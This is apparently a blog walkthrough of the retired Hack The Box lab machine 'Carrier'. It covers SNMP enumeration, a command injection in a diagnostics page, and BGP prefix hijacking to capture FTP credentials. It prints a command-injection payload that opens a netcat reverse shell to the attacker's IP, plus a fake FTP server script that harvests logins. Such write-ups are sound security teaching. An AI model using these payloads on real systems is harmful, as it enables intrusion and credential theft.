This post documents the complete walkthrough of Carrier, a retired vulnerable VM created by snowscan, and hosted at Hack The Box. If you are uncomfortable with spoilers, please stop reading now.

Background
Carrier is a retired vulnerable VM from Hack The Box.
Information Gathering
Letâs start with a nmap scan to establish the available services in the host.
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.105
...
PORT   STATE    SERVICE REASON         VERSION

nmap finds 22/tcp and 80/tcp open. In any case, letâs start with the http service. Hereâs how it looks like.



Itâs a login page with strange looking error codes.
Directory/File Enumeration
Letâs use wfuzz and see what we can discover.

Among the directories discovered, doc offers some valuable information. In it, thereâs a PDF document containing the description of the error codes.



You can see what the two strange looking error codes mean. And the password is reset to the serial number is what I think it meant.
After a couple of enumeration rounds I still couldnât find the serial number. It then dawned upon me that Iâve not check SNMP. Itâs a web interface to a piece of hardware after all. Many hardware vendors include SNMP for their products. Letâs see if we can snmpwalk the MIB hierarchy.



What do you know! The serial number is exposed and we manage to log in with credentials (admin:NET_45JDX23),



Holy cow!
Low-Privilege Shell
While I was checking out the pages, I chanced upon the Diagnostics page. It allows built-in checks and this is how it looks like.



Doesnât the output looks like the output of ps? Thereâs a hidden input field thatâs submitted along with the form whenever the button Verify status is clicked.



The value to the input field check is a base64-encoded quagga.



Hmm. Something funky is going on here.
With that in mind, I wrote a bash script to investigate whatâs going with the Diagnostics page.
diag.sh
#!/bin/bash

HOST=10.10.10.105
SERIAL=NET_45JDX23
ECHO="$(echo [email protected] | base64)"

# login
curl -c cookie \
     -d "username=admin&amp;password=$SERIAL" \
     http://$HOST/

# prettify output
curl -s \
     -b cookie \
     --data-urlencode "check=$ECHO" \
     http://$HOST/diag.php \
| xmllint --xpath "//p" --recover - 2&gt;/dev/null \
| sed -r -e 's/&gt;&lt;/&gt;\n&lt;/g' \
| sed -r -e 's/^&lt;p&gt;//' -e 's/&lt;\/p&gt;$//' -e '1d'

echo

rm -f cookie




I see whatâs going on here. Thereâs PHP code that does something like this.
shell_exec("bash -c ps waux | grep " . base64_decode($_POST['check']) . " | grep -v grep");

If I input something like this, I should get a shell, right? Letâs try it out.
--; rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0&lt;/tmp/p | nc 10.10.13.52 1234 &gt; /tmp/p




Indeed. A root shell no less!
â¦
My happiness soon faded because this isnât a root shell. Nonetheless, user.txt is located here.



You can see that the host isnât the final host; itâs a router. It has three network interfaces.



And, hereâs the routing table.



Looking at /root/.ssh/authorized_keys reveals whoâs allowed to SSH into the router.



In case you are wondering, I upgraded the shell with the Python3 pty module and some stty magic.
Looking back at the debug directory, a phpinfo() page was there for the viewing.



Thatâs the uname -a of the web host. Further down, the server IP is shown.



Neat. Saves me the effort to hunt for it in /24 space.
A bigger problem looms. Whatâs next? Where do we proceed from here?
Privilege Escalation
Earlier on, the doc directory revealed the error codes. Along with it, lies the ISPsâ BGP peering layout of their respective autonomous systems (or AS).



Coupled with the tickets, we can formalized a game plan.



But before we go over the game plan, letâs confirm the BGP peering topology with vtysh -c 'show ip bgp' on r1 (thatâs the host we are in. Itâs running a software-based router daemon quagga capable of doing BGP).



From the information above, we can see that the 10.120.15.0/24 prefix is advertised by AS300. Thatâs why the best path to 10.120.15.0/24 is through the edge router in AS300 because itâs directly connected to AS100. As such, itâs only one hop away. Compare this to another alternative and valid route. The route must first go to the edge router in AS200 and then to the edge router in AS300.
Hereâs the game plan. According to the tickets, an important FTP server I suppose, contains the golden ticket to own the system, lives in AS300. And, we have a accommodating VIP who is always trying to log in to the FTP server with his/her credentials. FTP is a plaintext protocol, which means that the credentials are also in clear. If we can somehow snoop on the traffic, we should be able to sniff out the credentials.
Enter BGP prefix hijacking. If we advertise a more specific prefix than 10.120.15.0/24 in AS100, we can trick all the traffic bound for the FTP server to come to our router r1 in AS100 instead. Of course, we also need to set up a FTP server to pull off the ruse.
Now, letâs see what Iâve found. The FTP server is at 10.120.15.10.



In addtion to FTP, the server is also running DNS and SSH service.



Which means, we can do something like this.



Now, before we modify the prefix advertisement in r1, know this. Thereâs a cron job that reverts quagga to its default configuration, lending evidence that Iâm taking the right approach.



The above can be shown with crontab -l. And hereâs what /opt/restore.sh looks like.



We need to disable the cron job. Add a comment with a # to disable it.
#*/10 * * * * /opt/restore.sh

Next, advertise the most specific 10.120.15.10/32 prefix like so. Restart quagga and wait for the advertisement to propagate to the other two AS.



The prefix is updated.



The next step involves setting a service listening at 21/tcp. I wrote a simple FTP server that does nothing but to extract the username and password; and to print it to stdout.
ftp.py
import socket

host = ''
port = 21

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  s.bind((host,port))
  s.listen(1)
  conn, addr = s.accept()
  with conn:
    while True:
      conn.send(b"220 Welcome to FTP\r\n")
      print(conn.recv(1024).decode('utf_8')[:-2])
      conn.send(b"331 User name okay need password\r\n")
      print(conn.recv(1024).decode('utf-8')[:-2])
      break
    conn.close()
  s.shutdown(socket.SHUT_RDWR)
  s.close()

Run it like so.
# python3 ftp.py &gt; ftp.txt &amp;

The last step is to configure the network interface eth2 to 10.120.15.10/24 and we are done.
# ifconfig eth2 10.120.15.10/24

Almost immediately, the credentials are printed out to /tmp/ftp.txt.



Awesome. Now, we can revert the network configurations and log in to carrier with the root credentials to claim our prize.



And our prizeâ¦




Afterthought
It was hell of a ride. The creator sure knows a thing or two about containers and container networking!
